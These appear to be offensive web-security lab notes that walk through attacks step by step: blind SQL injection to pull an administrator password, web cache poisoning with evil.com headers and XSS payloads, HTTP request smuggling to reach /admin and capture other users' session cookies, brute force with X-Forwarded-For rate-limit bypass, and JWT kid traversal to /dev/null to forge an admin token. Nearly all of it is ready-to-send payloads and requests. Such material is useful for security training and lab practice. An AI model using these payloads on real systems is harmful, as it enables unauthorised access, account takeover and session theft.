Blind SQLi — step-by-step:

# Step 1 — confirm injection works
' AND 1=1--    → response as normal (true)
' AND 1=2--    → response different / empty (false)

# Step 2 — verify table exists
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
→ true = users table exists

# If table name unknown — find via information_schema
' AND (SELECT SUBSTRING(table_name,1,1)
  FROM information_schema.tables
  WHERE table_schema='public' LIMIT 1)='u'--
→ brute-force char by char until you build the name

# Step 3 — verify user exists
' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--

# Step 4 — find password length (binary search)
' AND (SELECT 'x' FROM users WHERE username='administrator'
  AND LENGTH(password)>10)='x'--
' AND (SELECT 'x' FROM users WHERE username='administrator'
  AND LENGTH(password)=20)='x'--

# Step 5 — extract password char by char
' AND SUBSTRING((SELECT password FROM users
  WHERE username='administrator'),1,1)='a'--
→ no match → try next: 'b', 'c'...
→ found first char → move to position 2 → 3...

# In Intruder: mark §a§, payload: a-z 0-9
# Grep match: string present in true response (e.g. "Welcome")

Blind time-based (no boolean difference):

' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a')
  THEN pg_sleep(5) ELSE pg_sleep(0) END
  FROM users WHERE username='administrator')--
→ 5s delay = correct char

3. Web Cache Poison

How to find & verify

Surface: headers/parameters that affect the response but are not part of the cache key.

  1. Add ?cb=<random> — cache buster
  2. Add non-standard headers → check if reflected in links/redirects
  3. Param Miner (Burp) → find unkeyed params and headers
HeaderWhat to look for in response
X-Forwarded-Hosthost in links / redirects
X-Hostalternative to X-Forwarded-Host
X-Forwarded-Schemescheme (http/https) in redirect
X-Original-URLaccess control bypass

How to exploit

Combo: one header doesn't work → try both together:

X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
→ 302 Location: https://evil.com/

Unkeyed cookie → XSS:

Cookie: fehost=bad"></script><script>alert(1)</script>

Vary: User-Agent: get victim's UA via <img src="https://exploit-server/x"> → poison cache with that UA.

Unkeyed query string — ?cb=x doesn't work as buster → use header as cache buster:

Origin: https://cachebuster.evil.com

Cache parameter cloaking:

GET /?utm_content=x?callback=evil_payload
GET /?param=innocent;callback=evil  (Rails: ; = separator)

Fat GET — body param overrides URL param:

Cache keys the URL only; backend processes both URL and body. Duplicate the target param in the body — backend uses the body value, cache stores it under the original URL key.

GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

callback=alert(1)//

Cache key = ?callback=setCountryCookie (URL). Backend returns alert(1)//(…). Next victim hitting the same URL gets poisoned JS.

5. HTTP Request Smuggling

How to find & verify

Surface: sites behind a reverse proxy or load balancer. Always disable "Update Content-Length" in Burp Repeater before testing.

Step 1 — auto-detect: install HTTP Request Smuggler (BApp Store) → right-click request → Extensions → HTTP Request Smuggler → Smuggle probe. It reports the detected type.

Step 2 — manual timing check (if auto-detect fails):

Test CL.TE — send the request below. If it hangs (~10 s timeout) → CL.TE confirmed. Frontend forwards 6 bytes (CL=6: 0\r\n\r\nX), backend waits for more chunked data after the terminating 0 chunk.

POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

X

Test TE.CL — send the request below. If it hangs → TE.CL confirmed. Frontend uses TE, sends whole body; backend uses CL=3 and waits for 3 more bytes.

POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

Test CL.0 — target must be HTTP/1. Backend endpoint (e.g. /static/, /resources/) must ignore Content-Length. See exploit section.

Test H2.CL — switch Repeater to HTTP/2. Send a POST with content-length: 0 and a body. If backend uses CL=0, it treats the body as a new request — you'll get a timeout or an unexpected response on the second send:

POST / HTTP/2
Host: TARGET
content-length: 0

Send twice quickly. First response = normal. Second response = 404 / error for "SMUGGLED" path → H2.CL confirmed.

Test H2.TE — switch Repeater to HTTP/2. Add header via Inspector (name: foo, value: bar\r\nTransfer-Encoding: chunked). Send body with terminating chunk 0 + smuggled prefix. Send twice — second response differs → H2.TE confirmed.

CL.TE — bypass front-end access control:

Frontend uses CL → forwards exactly N bytes. Backend uses TE → sees chunk 0 (end), then treats the remainder as a new request. Frontend blocks GET /admin directly but doesn't inspect the smuggled suffix.

  1. Turn off "Update Content-Length" in Burp Repeater.
  2. Send the request below twice quickly — second response should be for /admin.
  3. If admin panel uses Host for internal checks — add Host: localhost to the smuggled request.

Common TE obfuscations (try each): Transfer-Encoding: xchunked / Transfer-Encoding :[tab]chunked / two TE headers (one valid, one invalid).

CL.0 — poison the back-end connection:

Backend ignores Content-Length on certain endpoints (static files, 404 pages) — treats the request as having no body. Frontend sends the body normally. Result: body lands in backend's buffer as the start of the next request.

  1. Find a GET/POST endpoint where backend ignores CL — try /resources/, /static/, known 404 paths.

  3. Send twice. Second response = response to GET /admin.

H2.CL — HTTP/2 downgrade:

HTTP/2 uses binary framing — no Content-Length needed. But after frontend downgrades to HTTP/1, it copies injected headers including content-length. Backend uses that CL value and ignores the rest of the body, treating it as a new request.

  1. In Burp Repeater — switch to HTTP/2.
  2. Add header content-length: 0 (lowercase — HTTP/2 requires lowercase headers).
  3. Put the smuggled request in the body.
  4. Send twice — second response is for the smuggled request.
POST / HTTP/2
Host: TARGET
content-length: 0

GET /admin HTTP/1.1
Host: TARGET
X-Ignore: x

Backend sees CL=0 → treats body as a new request starting with GET /admin. The next legitimate request from any user completes the smuggled request headers.

H2.TE — CRLF injection → bypass access control:

HTTP/2 forbids \r\n in header values — but some frontends don't enforce this before downgrading. Injecting \r\n into a header value creates a new header line after downgrade.

  1. Switch Repeater to HTTP/2.
  2. Open Inspector → add header: name foo, value bar + literal Enter/CRLF + Transfer-Encoding: chunked. Do not type this in the raw editor — Burp will escape it.
  3. Body: terminating chunk 0 + empty line + smuggled request.
  4. Send twice.

Site stores search queries. Smuggled request is a partial POST to the search endpoint — Content-Length: 800 tells backend to keep reading. Victim's next request (with their Cookie header) gets appended as the search body and saved.

  1. Switch Repeater to HTTP/2, add CRLF header via Inspector.

Split one HTTP/2 request into two complete HTTP/1 requests. Both get responses from the backend queue. Your request gets response A (normal). The second (smuggled) request steals response B — which may be another user's page with their session cookie in a redirect.

  1. Switch to HTTP/2, inject CRLF via Inspector.

6. Brute Force

How to find & verify

Surface: login form, password change, MFA code.

  • No rate limit → send 10+ requests in a row, no block
  • No lockout after N failed attempts
  • IP-based rate limit → bypass via X-Forwarded-For

How to exploit

Intruder (Sniper / Cluster Bomb): usernames.txt + passwords.txt.

IP rate limit: add X-Forwarded-For: <random> header on each request (Burp: add header in Intruder).

Lockout: insert your own correct password every N attempts in the password list.

MFA bruteforce: Burp macro — auto re-login after lockout → continue code brute-force.

kid path traversal — step by step:

kid tells the server which file to load as the signing key. If the path isn't validated, you can traverse to /dev/null — a file that always returns empty bytes. Sign the token with a null-byte key and the server will verify it against the same empty content.

  1. Open JWT Editor (BApp) → Keys tab → New Symmetric Key.
  2. In the generated key, replace the value of k with AA== (base64 of a null byte) → Save.
  3. In Burp Repeater, open the request that uses the JWT. Switch to the JSON Web Token tab.
  4. Edit the header: set "kid": "../../../../../../../dev/null"
  5. Edit the payload: set "sub": "administrator"
  6. Click Sign → select your AA== key → keep Don't modify header checked → OK.
  7. Send the request to /admin → you should get 200.
